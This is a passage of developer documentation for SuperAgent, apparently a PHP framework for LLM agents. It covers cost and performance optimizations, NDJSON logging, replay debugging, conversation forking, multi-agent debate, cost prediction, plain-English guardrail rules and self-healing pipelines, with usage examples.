Auto-downgrades to a cheaper model for pure tool-call turns (no text, just tool_use blocks), auto-upgrades back when the model produces substantial text.

```php
use SuperAgent\Optimization\ModelRouter;

$router = ModelRouter::fromConfig('claude-sonnet-4-6-20250627');

// Returns fast model or null (use primary)
$model = $router->route($messages, $turnCount);

// After each turn, record whether it was tool-only
$router->recordTurn($assistantMessage);
```

Routing logic:
1. First N turns (default 2): always use primary model
2. After 2+ consecutive tool-only turns: downgrade to fast model
3. When fast model produces text: auto-upgrade back
4. Never downgrade if primary is already a cheap model (heuristic: name contains "haiku")

**Impact**: 40-60% cost reduction.

#### Response Prefill (`ResponsePrefill`)

Uses Anthropic's assistant prefill to guide output after extended tool-call sequences. After 3+ consecutive tool round-trips, prefills `"I'll"` to encourage summarization instead of more tool calls. Conservative strategy: no prefill on first turn, after tool results, or during active exploration.

#### Prompt Cache Pinning (`PromptCachePinning`)

Auto-inserts cache boundary marker in system prompts. The `AnthropicProvider` splits the prompt at the boundary: static content before gets `cache_control: ephemeral`, dynamic content after does not. This enables prompt caching: the static prefix stays cached across turns.

Detection heuristics for the split point:
- Looks for dynamic section markers: `# Current`, `# Context`, `# Memory`, `# Session`, `# Recent`, `# Task`
- Falls back to 80% point if no markers found

**Impact**: ~90% prompt cache hit rate.

### Execution Performance

#### Parallel Tool Execution (`ParallelToolExecutor`)

When the LLM returns multiple tool_use blocks in one turn, read-only tools execute in parallel using PHP Fibers.

```php
use SuperAgent\Performance\ParallelToolExecutor;

$executor = ParallelToolExecutor::fromConfig();
$classified = $executor->classify($toolBlocks);
// $classified = ['parallel' => [...read-only...], 'sequential' => [...write...]]

$results = $executor->executeParallel($classified['parallel'], function ($block) {
    return $this->executeSingleTool($block);
});
```

Read-only (parallel-safe): `read`, `grep`, `glob`, `web_search`, `web_fetch`, `tool_search`, `task_list`, `task_get`

**Impact**: Multi-tool turn time: max(t1,t2,t3) instead of sum(t1+t2+t3).

#### Streaming Tool Dispatch (`StreamingToolDispatch`)

Pre-executes read-only tools as soon as their tool_use block is complete in the SSE stream, before the full LLM response finishes.

#### HTTP Connection Pooling (`ConnectionPool`)

Shared Guzzle clients per base URL with cURL keep-alive, TCP_NODELAY, and TCP_KEEPALIVE. Eliminates repeated TCP/TLS handshakes.

```php
use SuperAgent\Performance\ConnectionPool;

$pool = ConnectionPool::fromConfig();
$client = $pool->getClient('https://api.anthropic.com/', [
    'x-api-key' => $apiKey,
    'anthropic-version' => '2023-06-01',
]);
```

#### Speculative Prefetch (`SpeculativePrefetch`)

After a Read tool executes, predicts and pre-reads related files into memory cache:
- Source file → test files (`tests/Unit/BarTest.php`, `tests/Feature/BarTest.php`)
- Test file → source file
- PHP class → interfaces in same directory
- Same directory files with similar name prefix

Max 5 predictions per read, LRU cache with 50 entries.

#### Streaming Bash Executor (`StreamingBashExecutor`)

Streams Bash output with timeout truncation. Long output returns last N lines + summary header.

```php
use SuperAgent\Performance\StreamingBashExecutor;

$bash = StreamingBashExecutor::fromConfig();
$result = $bash->execute('npm test', '/path/to/project');
// $result = ['output' => '...', 'exit_code' => 0, 'truncated' => true, 'total_lines' => 1500]
```

#### Adaptive max_tokens (`AdaptiveMaxTokens`)

Dynamically adjusts `max_tokens` per turn based on expected response type:

| Context | max_tokens |
|---------|-----------|
| First turn | 8192 |
| Pure tool-call turn (no text) | 2048 |
| Reasoning/text turn | 8192 |

#### Batch API (`BatchApiClient`)

Queues non-realtime requests for Anthropic's Message Batches API (50% cost reduction).

```php
use SuperAgent\Performance\BatchApiClient;

$batch = BatchApiClient::fromConfig();
$batch->queue('task-1', $requestBody1);
$batch->queue('task-2', $requestBody2);

$results = $batch->submitAndWait(timeoutSeconds: 300);
// $results = ['task-1' => [...], 'task-2' => [...]]
```

**Note**: Disabled by default. Enable with `SUPERAGENT_PERF_BATCH_API=true`.

#### Local Tool Zero-Copy (`LocalToolZeroCopy`)

File content cache between Read/Edit/Write tools. Read results cached in memory, Edit/Write invalidates the cache. Uses md5 integrity check to detect external modifications.

```php
use SuperAgent\Performance\LocalToolZeroCopy;

$zc = LocalToolZeroCopy::fromConfig();
$zc->cacheFile('/src/Agent.php', $content);

// Next Read: check cache first
$cached = $zc->getCachedFile('/src/Agent.php');

// After Edit/Write: invalidate
$zc->invalidateFile('/src/Agent.php');
```

### Disabling All Optimizations

```env
# Token optimizations
SUPERAGENT_OPT_TOOL_COMPACTION=false
SUPERAGENT_OPT_SELECTIVE_TOOLS=false
SUPERAGENT_OPT_MODEL_ROUTING=false
SUPERAGENT_OPT_RESPONSE_PREFILL=false
SUPERAGENT_OPT_CACHE_PINNING=false

# Execution performance
SUPERAGENT_PERF_PARALLEL_TOOLS=false
SUPERAGENT_PERF_STREAMING_DISPATCH=false
SUPERAGENT_PERF_CONNECTION_POOL=false
SUPERAGENT_PERF_SPECULATIVE_PREFETCH=false
SUPERAGENT_PERF_STREAMING_BASH=false
SUPERAGENT_PERF_ADAPTIVE_TOKENS=false
SUPERAGENT_PERF_BATCH_API=false
SUPERAGENT_PERF_ZERO_COPY=false
```

### Troubleshooting

| Problem | Cause | Solution |
|---------|-------|----------|
| Model routing produces errors | Fast model can't handle complex tools | Set `SUPERAGENT_OPT_MODEL_ROUTING=false` or increase `min_turns_before_downgrade` |
| Tool results too aggressively compacted | Important context in old results lost | Increase `preserve_recent_turns` or `max_result_length` |
| Selective tools removes needed tool | Phase detection misclassified | Tool used in last 2 turns is always included; increase `max_tools` |
| Parallel execution causes file conflicts | Write tool incorrectly classified as read-only | Report bug — only `read`, `grep`, `glob`, `web_search`, `web_fetch`, `tool_search`, `task_list`, `task_get` are parallel-safe |
| Prefetch cache too large | Too many files cached | Reduce `max_cache_entries` or `max_file_size` |
| Batch API timeout | Large batch takes too long | Increase timeout in `submitAndWait()` or reduce batch size |

---

## 25. NDJSON Structured Logging

> Claude Code-compatible NDJSON (Newline Delimited JSON) logging for real-time process monitoring. Emits the same event format as CC's `stream-json` output.

### Overview

SuperAgent can write structured execution logs in NDJSON format — one JSON object per line, matching Claude Code's `stream-json` protocol. This enables:

- **Process monitor visibility**: tools like CC's bridge/sessionRunner can parse the log and display real-time tool activity
- **Debugging**: full execution transcript with tool calls, results, and token usage
- **Replay**: log files can be replayed to reconstruct execution flow

Two components:
- **`NdjsonWriter`** — Low-level writer that formats and emits individual NDJSON events
- **`NdjsonStreamingHandler`** — Factory that creates a `StreamingHandler` wired to `NdjsonWriter`

### Event Types

| Type | Role | Description |
|------|------|-------------|
| `assistant` | assistant | LLM response with text and/or tool_use content blocks + per-turn usage |
| `user` | user | Tool result with `parent_tool_use_id` set |
| `result` | — | Final execution result (success or error) |

### Usage

#### Quick: One-liner with StreamingHandler factory

```php
use SuperAgent\Logging\NdjsonStreamingHandler;

// Create handler that writes NDJSON to a log file
$handler = NdjsonStreamingHandler::create(
    logTarget: '/tmp/agent-execution.jsonl',
    agentId: 'my-agent',
);

$result = $agent->prompt('Fix the bug in UserController', $handler);
```

#### Full: With result/error events

```php
use SuperAgent\Logging\NdjsonStreamingHandler;

$pair = NdjsonStreamingHandler::createWithWriter(
    logTarget: '/tmp/agent.jsonl',
    agentId: 'task-123',
    onText: function (string $delta, string $full) {
        echo $delta;  // Stream text to terminal
    },
);

try {
    $result = $agent->prompt($prompt, $pair->handler);

    $pair->writer->writeResult(
        numTurns: $result->turns(),
        resultText: $result->text(),
        usage: $result->totalUsage()->toArray(),
        costUsd: $result->totalCostUsd,
    );
} catch (\Throwable $e) {
    $pair->writer->writeError($e->getMessage());
    throw $e;
}
```

#### Low-level: Direct NdjsonWriter

```php
use SuperAgent\Logging\NdjsonWriter;

$writer = new NdjsonWriter(
    agentId: 'agent-1',
    sessionId: 'session-abc',
    stream: fopen('/tmp/log.jsonl', 'a'),
);

// Write individual events
$writer->writeToolUse('Read', 'tu_001', ['file_path' => '/src/Agent.php']);
$writer->writeToolResult('tu_001', 'Read', '<?php class Agent { ... }', false);
$writer->writeAssistant($assistantMessage);
$writer->writeResult(3, 'Task completed.', ['input_tokens' => 5000, 'output_tokens' => 1200]);
```

### NDJSON Format Reference

#### Assistant event (tool_use)
```json
{"type":"assistant","message":{"role":"assistant","content":[{"type":"tool_use","id":"tu_001","name":"Read","input":{"file_path":"/src/Agent.php"}}]},"usage":{"inputTokens":1500,"outputTokens":200,"cacheReadInputTokens":0,"cacheCreationInputTokens":0},"session_id":"agent-1","uuid":"a1b2c3d4-...","parent_tool_use_id":null}
```

#### User event (tool_result)
```json
{"type":"user","message":{"role":"user","content":[{"type":"tool_result","tool_use_id":"tu_001","content":"<?php class Agent { ... }"}]},"parent_tool_use_id":"tu_001","session_id":"agent-1","uuid":"e5f6g7h8-..."}
```

#### Result event (success)
```json
{"type":"result","subtype":"success","duration_ms":12345,"duration_api_ms":12345,"is_error":false,"num_turns":3,"result":"Task completed.","total_cost_usd":0.005,"usage":{"inputTokens":5000,"outputTokens":1200,"cacheReadInputTokens":800,"cacheCreationInputTokens":0},"session_id":"agent-1","uuid":"i9j0k1l2-..."}
```

#### Result event (error)
```json
{"type":"result","subtype":"error_during_execution","duration_ms":500,"is_error":true,"num_turns":0,"errors":["Connection refused"],"session_id":"agent-1","uuid":"m3n4o5p6-..."}
```

### Child Process Integration

Child agent processes (`agent-runner.php`) automatically emit NDJSON on stderr. The parent's `ProcessBackend::poll()` detects JSON lines (starting with `{`) and queues them as progress events. `AgentTool::applyProgressEvents()` parses both CC NDJSON format and the legacy `__PROGRESS__:` format for backward compatibility.

### API Reference

#### `NdjsonWriter`

| Method | Description |
|--------|-------------|
| `writeAssistant(AssistantMessage, ?parentToolUseId)` | Emit assistant message with content blocks + usage |
| `writeToolUse(toolName, toolUseId, input)` | Emit single tool_use as assistant message |
| `writeToolResult(toolUseId, toolName, result, isError)` | Emit tool result as user message |
| `writeResult(numTurns, resultText, usage, costUsd)` | Emit success result |
| `writeError(error, subtype)` | Emit error result |

#### `NdjsonStreamingHandler`

| Method | Description |
|--------|-------------|
| `create(logTarget, agentId, append, onText, onThinking)` | Returns `StreamingHandler` |
| `createWithWriter(logTarget, agentId, append, onText, onThinking)` | Returns `{handler, writer}` pair |

### Troubleshooting

| Problem | Cause | Solution |
|---------|-------|----------|
| Log file empty | Handler not passed to `$agent->prompt()` | Ensure handler is the second argument |
| No tool events in log | Only `onText` registered | Use `NdjsonStreamingHandler::create()` which registers all callbacks |
| Process monitor shows no activity | Parsing expects NDJSON but gets plain text | Verify child process uses `NdjsonWriter` (v0.6.18+) |
| Unicode breaks NDJSON parser | U+2028/U+2029 in content | `NdjsonWriter` escapes these automatically |

---

## 26. Agent Replay & Time-Travel Debugging

> Record complete execution traces and replay them step-by-step for debugging complex multi-agent interactions. Inspect agent state at any point, search events, fork from any step, and visualize timelines with cumulative cost tracking.

### Overview

The Replay system captures every significant event during agent execution -- LLM calls, tool calls, agent spawns, inter-agent messages, and periodic state snapshots -- into an immutable `ReplayTrace`. A `ReplayPlayer` lets you navigate forward/backward through the trace, inspect individual agents, and fork from any step to re-explore different paths.

Key classes:

| Class | Role |
|---|---|
| `ReplayRecorder` | Records events during execution |
| `ReplayTrace` | Immutable trace with events and metadata |
| `ReplayEvent` | Single event (5 types: llm_call, tool_call, agent_spawn, agent_message, state_snapshot) |
| `ReplayPlayer` | Step-by-step navigation, inspection, search, fork |
| `ReplayState` | Reconstructed state at a specific step |
| `ReplayStore` | NDJSON persistence with list/prune/delete |

### Configuration

```php
'replay' => [
    'enabled' => env('SUPERAGENT_REPLAY_ENABLED', false),
    'storage_path' => env('SUPERAGENT_REPLAY_STORAGE_PATH', null),
    'snapshot_interval' => (int) env('SUPERAGENT_REPLAY_SNAPSHOT_INTERVAL', 5),
    'max_age_days' => (int) env('SUPERAGENT_REPLAY_MAX_AGE_DAYS', 30),
],
```

### Usage

#### Recording Execution Traces

```php
use SuperAgent\Replay\ReplayRecorder;

$recorder = new ReplayRecorder('session-123', snapshotInterval: 5);

// Record during agent execution (integrated into QueryEngine)
$recorder->recordLlmCall('main', 'claude-sonnet-4-6', $messages, $response, $usage, $durationMs);
$recorder->recordToolCall('main', 'read', $toolId, $input, $output, $durationMs);
$recorder->recordAgentSpawn('child-1', 'main', 'researcher', $config);
$recorder->recordAgentMessage('main', 'main', 'child-1', 'Research this topic');

// Periodic snapshots (automatic based on interval)
if ($recorder->shouldSnapshot($turnCount)) {
    $recorder->recordStateSnapshot('main', $messages, $turnCount, $cost, $activeAgents);
}

$trace = $recorder->finalize();
```

#### Replaying and Debugging

```php
use SuperAgent\Replay\ReplayPlayer;
use SuperAgent\Replay\ReplayStore;

// Load a saved trace
$store = new ReplayStore(storage_path('superagent/replays'));
$trace = $store->load('session-123');

$player = new ReplayPlayer($trace);

// Navigate step by step
$state = $player->stepTo(15);       // Jump to step 15
$state = $player->next();            // Forward one step
$state = $player->previous();        // Back one step

// Inspect specific agent state
$info = $player->inspect('child-1');
// Returns: agent_id, event_count, llm_calls, tool_calls, estimated_cost, last_activity

// Search for events
$results = $player->search('bash');  // Find all events mentioning 'bash'

// Get formatted timeline
$timeline = $player->getTimeline();
// Each entry: step, type, agent, timestamp, duration_ms, cumulative_cost, [model/tool/role]

// Fork from a point for re-execution
$forkedTrace = $player->fork(10);   // Get trace up to step 10 for replay with different approach
```

### Troubleshooting

| Problem | Cause | Solution |
|---------|-------|----------|
| Trace file too large | Long-running session | Increase `snapshot_interval` to reduce snapshot frequency |
| Missing events in replay | Recorder not wired | Ensure `ReplayRecorder` hooks into QueryEngine |
| `ReplayStore::load()` fails | Corrupted NDJSON | Check file for malformed JSON lines |

---

## 27. Conversation Forking

> Branch a conversation at any point to explore multiple approaches in parallel, then automatically select the best result using built-in or custom scoring strategies.

### Overview

Conversation Forking lets you take a conversation snapshot, create N branches with different prompts or strategies, execute them all in parallel via `proc_open`, and pick the best one. This is ideal for:

- Comparing design approaches (Strategy vs Command vs simple extraction)
- A/B testing different prompts
- Exploring solution variants under budget constraints

Key classes:

| Class | Role |
|---|---|
| `ForkManager` | High-level API for creating and executing forks |
| `ForkSession` | Represents a forking session with base messages and branches |
| `ForkBranch` | Single branch with prompt, status, result, score |
| `ForkExecutor` | Parallel execution via `proc_open` |
| `ForkResult` | Aggregated results with scoring and ranking |
| `ForkScorer` | Built-in scoring strategies |

### Configuration

```php
'fork' => [
    'enabled' => env('SUPERAGENT_FORK_ENABLED', false),
    'default_timeout' => (int) env('SUPERAGENT_FORK_TIMEOUT', 300),
    'max_branches' => (int) env('SUPERAGENT_FORK_MAX_BRANCHES', 5),
],
```

### Usage

#### Same Prompt, Multiple Attempts

```php
use SuperAgent\Fork\ForkManager;
use SuperAgent\Fork\ForkExecutor;
use SuperAgent\Fork\ForkScorer;

$manager = new ForkManager(new ForkExecutor());

$session = $manager->fork(
    messages: $agent->getMessages(),
    turnCount: $currentTurn,
    prompt: 'Refactor this service class for better testability',
    branches: 3,
    config: ['model' => 'sonnet', 'max_turns' => 10],
);

$result = $manager->execute($session);

// Select best by cost efficiency
$best = $result->getBest([ForkScorer::class, 'costEfficiency']);
echo $best->getLastAssistantMessage();
```

#### Different Approaches

```php
$session = $manager->forkWithVariants(
    messages: $agent->getMessages(),
    turnCount: $currentTurn,
    prompts: [
        'Refactor using the Strategy pattern',
        'Refactor using the Command pattern',
        'Refactor using simple function extraction',
    ],
);

$result = $manager->execute($session);

// Composite scoring: 70% cost efficiency + 30% brevity
$scorer = ForkScorer::composite(
    [[ForkScorer::class, 'costEfficiency'], [ForkScorer::class, 'brevity']],
    [0.7, 0.3],
);

$ranked = $result->getRanked($scorer);
foreach ($ranked as $branch) {
    echo "#{$branch->id}: score={$branch->score}, cost=\${$branch->cost}\n";
}
```

### Troubleshooting

| Problem | Cause | Solution |
|---------|-------|----------|
| All branches fail | `agent-runner.php` not found | Verify `bin/agent-runner.php` exists and is executable |
| Branches timeout | Complex task + short timeout | Increase `fork.default_timeout` or per-session `timeout` |
| Scores all zero | Using `completeness` with chat-only tasks | Use `costEfficiency` or `brevity` for non-tool tasks |

---

## 28. Agent Debate Protocol

> Three structured multi-agent collaboration modes -- Debate, Red Team, and Ensemble -- that improve output quality through adversarial or independent-then-merge approaches.

### Overview

The Debate Protocol goes beyond simple parallel execution by introducing structured interaction patterns between agents:

1. **Debate**: A proposer argues a position, a critic finds flaws, and a judge synthesizes the best approach. Runs for multiple rounds with rebuttals.
2. **Red Team**: A builder creates a solution, an attacker systematically finds vulnerabilities (security, edge cases, performance), and a reviewer produces the final assessment.
3. **Ensemble**: N agents solve the same problem independently with potentially different models, then a merger combines the best elements from each solution.

Key classes:

| Class | Role |
|---|---|
| `DebateOrchestrator` | Main entry point with `debate()`, `redTeam()`, `ensemble()` methods |
| `DebateProtocol` | Internal flow logic for each mode |
| `DebateConfig` / `RedTeamConfig` / `EnsembleConfig` | Fluent configuration |
| `DebateRound` | Single round of debate (proposer argument, critic response, optional rebuttal) |
| `DebateResult` | Final result with rounds, verdict, cost breakdown, contributions |

### Configuration

```php
'debate' => [
    'enabled' => env('SUPERAGENT_DEBATE_ENABLED', false),
    'default_rounds' => (int) env('SUPERAGENT_DEBATE_ROUNDS', 3),
    'default_max_budget' => (float) env('SUPERAGENT_DEBATE_MAX_BUDGET', 5.0),
],
```

### Usage

#### Structured Debate

```php
use SuperAgent\Debate\DebateOrchestrator;
use SuperAgent\Debate\DebateConfig;

$orchestrator = new DebateOrchestrator($agentRunner);

$config = DebateConfig::create()
    ->withProposerModel('opus')
    ->withCriticModel('sonnet')
    ->withJudgeModel('opus')
    ->withRounds(3)
    ->withMaxBudget(5.0)
    ->withJudgingCriteria('Evaluate correctness, maintainability, and performance');

$result = $orchestrator->debate($config, 'Should we use microservices or monolith for this project?');

echo $result->getVerdict();
echo "Cost: $" . $result->totalCost;
```

#### Red Team Security Review

```php
use SuperAgent\Debate\RedTeamConfig;

$config = RedTeamConfig::create()
    ->withBuilderModel('opus')
    ->withAttackerModel('sonnet')
    ->withAttackVectors(['security', 'edge_cases', 'race_conditions', 'error_handling'])
    ->withRounds(3);

$result = $orchestrator->redTeam($config, 'Build a JWT authentication system');

foreach ($result->getRounds() as $round) {
    echo "Round {$round->roundNumber}:\n";
    echo "  Solution: " . substr($round->proposerArgument, 0, 100) . "...\n";
    echo "  Issues: " . substr($round->criticResponse, 0, 100) . "...\n";
}
```

#### Ensemble Solving

```php
use SuperAgent\Debate\EnsembleConfig;

$config = EnsembleConfig::create()
    ->withAgentCount(3)
    ->withModels(['opus', 'sonnet', 'haiku'])
    ->withMergerModel('opus')
    ->withMergeCriteria('Take the best algorithm from each, prefer correctness over performance');

$result = $orchestrator->ensemble($config, 'Implement a rate limiter with sliding window');

echo $result->getVerdict();       // Merged solution
echo $result->recommendation;     // Actionable recommendation
```

### Troubleshooting

**Debate costs too much.** Use `sonnet` for proposer/critic and `opus` only for the judge. Reduce `rounds` to 2. Set a strict `maxBudget`.

**Red team attacker misses real issues.** Add specific `attackVectors` relevant to your domain. Consider a custom `attackerSystemPrompt` with domain-specific attack patterns.

---

## 29. Cost Prediction Engine

> Estimate task cost before execution using historical data and prompt complexity analysis. Compare costs across models instantly.

### Overview

The Cost Prediction Engine analyzes prompts to predict token usage, turns needed, and total cost -- before spending a single token. It uses three strategies in priority order:

1. **Historical**: If similar tasks have been recorded, uses weighted average (recent data weighted higher). Confidence up to 95%.
2. **Hybrid**: If type-level averages exist (e.g., "refactoring tasks on Sonnet"), adjusts by complexity. Confidence up to 70%.
3. **Heuristic**: Estimates tokens from prompt length and complexity patterns × model pricing. Confidence 30%.

Key classes:

| Class | Role |
|---|---|
| `CostPredictor` | Main prediction engine |
| `TaskAnalyzer` | Classifies task type and complexity from prompt text |
| `TaskProfile` | Analysis result (type, complexity, estimated tokens/turns/tools) |
| `CostEstimate` | Prediction with bounds, confidence, and `withModel()` re-estimation |
| `CostHistoryStore` | Persistent JSON storage of actual execution data |
| `PredictionAccuracy` | Tracks prediction vs actual accuracy |

### Configuration

```php
'cost_prediction' => [
    'enabled' => env('SUPERAGENT_COST_PREDICTION_ENABLED', false),
    'storage_path' => env('SUPERAGENT_COST_PREDICTION_STORAGE_PATH', null),
],
```

### Usage

```php
use SuperAgent\CostPrediction\CostPredictor;
use SuperAgent\CostPrediction\CostHistoryStore;

$predictor = new CostPredictor(new CostHistoryStore(storage_path('superagent/cost_history')));

// Estimate a single task
$estimate = $predictor->estimate('Refactor all controllers to use DTOs', 'claude-sonnet-4-6');

echo $estimate->format();
// "Estimated: $0.5200 (range: $0.2080-$1.3000), ~45,000 tokens, ~8 turns, confidence: 30% [heuristic]"

if (!$estimate->isWithinBudget(1.00)) {
    // Try a cheaper model
    $cheaper = $estimate->withModel('haiku');
    echo $cheaper->format();
}

// Compare across models
$comparison = $predictor->compareModels('Write unit tests for UserService', ['opus', 'sonnet', 'haiku']);
foreach ($comparison as $model => $est) {
    echo "{$model}: \${$est->estimatedCost} (confidence: {$est->confidence})\n";
}

// Record actual execution for future predictions
$predictor->recordExecution($taskHash, 'sonnet', $actualCost, $actualTokens, $actualTurns, $durationMs);
```

### Troubleshooting

**Predictions are always "heuristic" with 30% confidence.** Record actual executions via `recordExecution()`. After 3+ similar tasks, predictions switch to "historical" with higher confidence.

**Wrong task type detected.** `TaskAnalyzer` uses keyword heuristics. For ambiguous prompts, the type defaults to "chat". Include action verbs like "refactor", "fix", "write tests" for accurate detection.

---

## 30. Natural Language Guardrails

> Define guardrail rules in plain English instead of YAML. Zero-cost compilation (no LLM calls) via deterministic pattern matching.

### Overview

Natural Language Guardrails let non-technical stakeholders define security and compliance rules without learning the YAML DSL. The `RuleParser` uses regex patterns and keyword matching to compile English sentences into standard guardrail conditions. It handles 6 rule types:

| Rule Type | Example | Compiled Action |
|---|---|---|
| Tool restriction | "Never modify files in database/migrations" | deny + tool_input_contains |
| Cost rule | "If cost exceeds $5, pause and ask" | ask + cost_exceeds |
| Rate limit | "Max 10 bash calls per minute" | rate_limit + rate condition |
| File restriction | "Don't touch .env files" | deny + tool_input_contains |
| Warning | "Warn if modifying config files" | warn + tool_input_contains |
| Content rule | "All generated code must have error handling" | warn (needs review) |

### Configuration

```php
'nl_guardrails' => [
    'enabled' => env('SUPERAGENT_NL_GUARDRAILS_ENABLED', false),
    'rules' => [
        'Never modify files in database/migrations',
        'If cost exceeds $5, pause and ask for approval',
        'Max 10 bash calls per minute',
    ],
],
```

### Usage

#### Fluent API

```php
use SuperAgent\Guardrails\NaturalLanguage\NLGuardrailFacade;

$compiled = NLGuardrailFacade::create()
    ->rule('Never modify files in database/migrations')
    ->rule('If cost exceeds $5, pause and ask for approval')
    ->rule('Max 10 bash calls per minute')
    ->rule("Don't touch .env files")
    ->rule('Block all web searches')
    ->compile();

echo "Total: {$compiled->totalRules}, High confidence: {$compiled->highConfidenceCount}\n";

// Check rules that need human review
foreach ($compiled->getNeedsReview() as $rule) {
    echo "REVIEW: {$rule->originalText} (confidence: {$rule->confidence})\n";
}

// Export as YAML for GuardrailsEngine
$yaml = $compiled->toYaml();
file_put_contents('guardrails-from-nl.yaml', $yaml);
```

#### Direct Compilation

```php
use SuperAgent\Guardrails\NaturalLanguage\NLGuardrailCompiler;

$compiler = new NLGuardrailCompiler();
$rule = $compiler->compile('If cost exceeds $10, stop execution');

echo $rule->groupName;     // "cost"
echo $rule->confidence;    // 0.9
echo $rule->needsReview;   // false
```

### Troubleshooting

**Rule compiles with low confidence.** The parser uses regex patterns -- rephrase to match supported formats. E.g., "No bash" → "Block all bash calls".

**Rule marked as needsReview.** Ambiguous rules that don't match any pattern get low confidence. Either rephrase in a supported format or manually review the compiled YAML output.

---

## 31. Self-Healing Pipelines

> When pipeline steps fail, automatically diagnose root cause, create a healing plan, apply intelligent mutations, and retry -- going beyond simple retry with real adaptation.

### Overview

Self-Healing Pipelines replace the basic `retry` failure strategy with an intelligent `self_heal` strategy that:

1. **Diagnoses** the failure using rule-based classification (fast, free) or LLM-based analysis (for ambiguous cases)
2. **Plans** a healing approach based on the diagnosis category
3. **Mutates** the step configuration (prompt, model, timeout, context)
4. **Retries** with the mutated configuration

The system classifies failures into 8 categories and maps each to appropriate healing strategies:

| Error Category | Healing Strategy | Example |
|---|---|---|
| `timeout` | Increase timeout + simplify task | "Connection timed out after 60s" |
| `rate_limit` | Wait + retry with increased timeout | "429 Too Many Requests" |
| `model_limitation` | Upgrade model + simplify prompt | "Token limit exceeded" |
| `resource_exhaustion` | Simplify task + reduce output | "Out of memory" |
| `external_dependency` | Retry with backoff | "Connection refused" |
| `tool_failure` | Modify prompt to avoid failed tool | "Tool execution error" |
| `input_error` | Add context about the error | "File not found" |
| `unknown` | Add error context + careful approach | (fallback) |

Key classes:

| Class | Role |
|---|---|
| `SelfHealingStrategy` | Main healing orchestrator with `heal()` and `canHeal()` |
| `DiagnosticAgent` | Rule-based + LLM-based failure diagnosis |
| `StepMutator` | Applies 6 mutation types to step configs |
| `StepFailure` | Rich failure context with error categorization |
| `Diagnosis` | Root cause analysis with confidence and suggested fixes |
| `HealingPlan` | Strategy-specific mutations with success rate estimates |
| `HealingResult` | Outcome with full diagnosis/plan history |

### Configuration

```php
'self_healing' => [
    'enabled' => env('SUPERAGENT_SELF_HEALING_ENABLED', false),
    'max_heal_attempts' => (int) env('SUPERAGENT_SELF_HEALING_MAX_ATTEMPTS', 3),
    'diagnose_model' => env('SUPERAGENT_SELF_HEALING_DIAGNOSE_MODEL', 'sonnet'),
    'max_diagnose_budget' => (float) env('SUPERAGENT_SELF_HEALING_MAX_BUDGET', 0.50),
    'allowed_mutations' => ['modify_prompt', 'change_model', 'adjust_timeout', 'add_context', 'simplify_task'],
],
```

### Usage

```php
use SuperAgent\Pipeline\SelfHealing\SelfHealingStrategy;
use SuperAgent\Pipeline\SelfHealing\StepFailure;

$healer = new SelfHealingStrategy(config: [
    'max_heal_attempts' => 3,
    'diagnose_model' => 'sonnet',
]);

// When a pipeline step fails
$failure = new StepFailure(
    stepName: 'deploy_service',
    stepType: 'agent',
    stepConfig: ['prompt' => 'Deploy to staging', 'timeout' => 60, 'model' => 'sonnet'],
    errorMessage: 'Connection timed out after 60 seconds',
    errorClass: 'RuntimeException',
    stackTrace: $exception->getTraceAsString(),
    attemptNumber: 1,
);

if ($healer->canHeal($failure)) {
    $result = $healer->heal($failure, function (array $mutatedConfig) {
        // Re-execute the step with mutated config
        return $this->executeStep($mutatedConfig);
    });

    if ($result->wasHealed()) {
        echo "Healed after {$result->attemptsUsed} attempts: {$result->summary}\n";
        $stepOutput = $result->result;
    } else {
        echo "Could not heal: {$result->summary}\n";
    }
}
```

#### In Pipeline YAML

```yaml
steps:
  - name: deploy
    type: agent
    prompt: "Deploy the service to staging"
    timeout: 120
    on_failure:
      strategy: self_heal
      max_attempts: 3
      diagnose_model: sonnet
```

### Troubleshooting

**Healer always fails.** Check `allowed_mutations` -- if too restrictive, the healer can't make meaningful changes. Ensure at least `modify_prompt` and `adjust_timeout` are allowed.

**Healing costs too much.** The diagnostic agent uses `sonnet` by default. Set `diagnose_model: haiku` for cheaper diagnosis. Reduce `max_heal_attempts` to 2.

**Unrecoverable errors trigger healing.** `InvalidArgumentException` and `LogicException` are auto-classified as unrecoverable. Custom exceptions need `isRecoverable()` logic in `StepFailure`.
